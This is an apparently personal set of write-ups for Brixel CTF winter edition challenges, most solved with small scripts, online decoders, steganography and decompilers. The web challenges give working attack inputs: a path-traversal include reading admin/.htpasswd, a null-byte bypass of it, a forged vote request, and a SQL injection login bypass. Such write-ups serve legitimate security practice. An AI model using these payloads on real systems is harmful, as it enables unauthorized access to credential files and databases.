
These are writeups for the [Brixel CTF winter edition](https://ctf.brixel.space/) challenges that I personally solved.

## speedy

```python
import requests
from lxml import html

s = requests.Session()
url = 'http://timesink.be/speedy/index.php'
r = s.get(url)
tree = html.fromstring(r.content)
response = tree.xpath('//div["rndstring"]/text()')[1]
print ("Random string is :"+response)
r = s.post(url,data={"inputfield":response})
print (r.content)
```

## keepwalking

```python
X = 1
Y = 1

previous_answer = 1

while True:
    answer = X*Y+previous_answer + 3
    if X == 525:
        print ("The answer is :"+str(answer))
        break
    X = X + 1
    Y = Y + 1
    previous_answer = answer
```

## browsercheck

```bash
curl -A "Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://sp.ask.com/docs/about/tech_crawling.html)" http://timesink.be/browsercheck/ 

<html><body><div align="center"><h1>congratulations</h1>the flag is 'brixelCTF{askwho?}'</div></body></html>
```

## login 5

Deobfuscate javascript with [JS Nice](http://jsnice.org/) and add a console print to check what password is compared against and evaluate the function:

```javascript
'use strict';
/** @type {!Array} */
var _0x2c58 = ["getElementById", "Incorrect password", "Password Verified", "length", "substr", "the_password", "abcdefghijklmnopqrstuvwxyz1234567890!{}"];
(function(data, i) {
  /**
   * @param {number} isLE
   * @return {undefined}
   */
  var write = function(isLE) {
    for (; --isLE;) {
      data["push"](data["shift"]());
    }
  };
  write(++i);
})(_0x2c58, 145);
/**
 * @param {number} level
 * @param {?} ai_test
 * @return {?}
 */
var _0x58ab = function(level, ai_test) {
  /** @type {number} */
  level = level - 402;
  var rowsOfColumns = _0x2c58[level];
  return rowsOfColumns;
};
/**
 * @return {undefined}
 */
function verify() {
  /** @type {function(number, ?): ?} */
  var __ = _0x58ab;
  password = document[__(404)](__(402))["value"];
  alphabet = __(403);
  newpassword = alphabet[__(408)](1, 1);
  newpassword = newpassword + alphabet[__(408)](17, 1);
  newpassword = newpassword + alphabet[__(408)](8, 1);
  newpassword = newpassword + alphabet["substr"](23, 1);
  newpassword = newpassword + alphabet[__(408)](4, 1);
  newpassword = newpassword + alphabet[__(408)](11, 1);
  newpassword = newpassword + alphabet[__(408)](2, 1);
  newpassword = newpassword + alphabet[__(408)](19, 1);
  newpassword = newpassword + alphabet[__(408)](5, 1);
  newpassword = newpassword + alphabet[__(408)](alphabet[__(407)] - 2, 1);
  newpassword = newpassword + alphabet["substr"](alphabet[__(407)] - 4, 1);
  newpassword = newpassword + alphabet[__(408)](1, 1);
  newpassword = newpassword + alphabet[__(408)](5, 1);
  newpassword = newpassword + alphabet["substr"](20, 1);
  newpassword = newpassword + alphabet[__(408)](18, 1);
  newpassword = newpassword + alphabet[__(408)](2, 1);
  newpassword = newpassword + alphabet["substr"](0, 1);
  newpassword = newpassword + alphabet[__(408)](19, 1);
  newpassword = newpassword + alphabet[__(408)](8, 1);
  newpassword = newpassword + alphabet[__(408)](alphabet[__(407)] - 4, 1);
  newpassword = newpassword + alphabet[__(408)](13, 1);
  newpassword = newpassword + alphabet["substr"](alphabet[__(407)] - 1, 1);
  console.log("Comparing against:"+newpassword); // this will print out the flag
  if (password == newpassword) {
    alert(__(406));
  } else {
    alert(__(405));
  }
}
```
from console check the flag: `brixelctf{0bfuscati0n}`

## Quizbot

Read the answers to a file:

```python
import requests
from lxml import html

s = requests.Session()

f = open("answers.txt","w")
url = 'http://timesink.be/quizbot/index.php'

for i in range(1000):
    r = s.get(url)
    answer = s.post(url,data={'insert_answer':'ffwefwefweggf'}) # a dummy answer
    tree = html.fromstring(answer.content)
    answer_text = tree.xpath('//*[@id="answer"]')[0].text
    answers.append(answer_text)
    print(answer_text)
    f.write(answer_text+'\n')

f.close()
```
And answer the questions:

```python
import requests
from lxml import html

s = requests.Session()

f = open("answers.txt","r")
url = 'http://timesink.be/quizbot/index.php'

for i in range(1000):
    answer = f.readline().strip()
    print(answer)
    r = s.get(url)
    answer = s.post(url,data={'insert_answer':answer,'submit':'answer'})
    print (answer.content)

f.close()
```

## Sea code

decode the wav file at [morsecode.world](https://morsecode.world/international/decoder/audio-decoder-adaptive.html)


## Scheiße

Decoded enigma cipher at [cryptii](https://cryptii.com/). Flag was just sauerkraut nothing more.

![enigma]({{ site_url }}/assets/brixel/enigma.png)

## Lottery ticket

Analyze the file using [FotoForencics](https://www.fotoforensics.com/) and simply add the numbers together.
![analyzed]({{ site_url }}/assets/brixel/fotoforencics.png)

## Merda

Vigenere cipher, solve online: [dcode.fr](https://www.dcode.fr/vigenere-cipher). The key is 'f'

## Rufus the vampire cat
Use steghide with an empty passphrase.
```
steghide extract -sf rufus.jpg             
Enter passphrase: 
wrote extracted data to "steganopayload639.txt".
cat steganopayload639.txt
```

## Android app

1. decompile online with https://www.decompiler.com/
2. download .zip
3. search for brixelctf{ to find the flag string

## no peeking!

Open the binary with dotPeek. Navigate to Form1.showFlag() and read the flag.

## registerme.exe

Exmining the strings in the file we notice that it's a Visual Basic 6.0 executable. Reverse it with [VB Decompiler](https://www.vb-decompiler.org/download.htm). We then notice that the program has a timer and it checks if `activation.key` file exists and if so it shows a button and when it's clicked the key is shown. So simply add any file with the right name to get the flag.

Could also have used [Sysinternals Procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) to see what operations the executable is doing.

## The tape

Install [WAV-PRG](http://wav-prg.sourceforge.net/) and use it to convert the file into a .tap. Open the file using [C64 emulator](https://virtualconsoles.com/online-emulators/c64/) to reveal the flag

![tape]({{ site_url }}/assets/brixel/tape.png)


## Cookieee!

This is a Unity game. Reading instructions from: [Hacking Unity](https://www.unknowncheats.me/forum/unity/285864-beginners-guide-hacking-unity-games.html)
Open the assebmly with dnSpy and locate cookieScript which has the insane score requirement. Reduce it to 10 and compile + save the dll.
![cookie]({{ site_url }}/assets/brixel/cookies.png)

 Run the program and play the game until you get the flag.

## Pathfinders #1

There is an unsafe include that allows inclusion of other pages by manipulating the url:

```
view-source:http://timesink.be/pathfinder/index.php?page=admin/.htpasswd
```

## Pathfinders #2

The same unsafe include but with file name protection. Bypass using null byte:

```
http://timesink.be/pathfinder2/index.php?page=admin/.htpasswd%00.php
```

## SnackShack awards

The website relies on client side validation. Capture the request with Burpsuite and add 5000 votes before forwarding the request to get the flag.

```
POST /snackshackaward/stemmen.php HTTP/1.1
Host: timesink.be
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: fi-FI,fi;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 86
Origin: http://timesink.be
DNT: 1
Connection: close
Referer: http://timesink.be/snackshackaward/
Upgrade-Insecure-Requests: 1

score_bammens=0&score_omejan=0&score_fontainas=0&score_tpleintje=5000&score_frietuurtje=0
```

## Flat earth

Find the hidden admin.php by looking at the source code. There is an sql injection vulnerability that can be abused using the following payload in username:

```
') or 1=1 --
```

## A song

It's a program written in [Rockstar](https://esolangs.org/wiki/Rockstar). Run the code online at [CodeWithRockstar](https://codewithrockstar.com/online) for the flag.

## Lost evidence

unzip the file. use `foremost evidence.img` to extract the wav files. It is a recorded phone call with DTMF tones. Use audacity and frequencies from [DTMF Wikipedia](https://en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling) to figure out which keys where pressed since had a ton of trouble decoding it just right with any programs. 
![dtmf]({{ site_url }}/assets/brixel/dtmf.jpg)
After decoding most of the message easily it took a while to figure out the substance as **cocaine**.
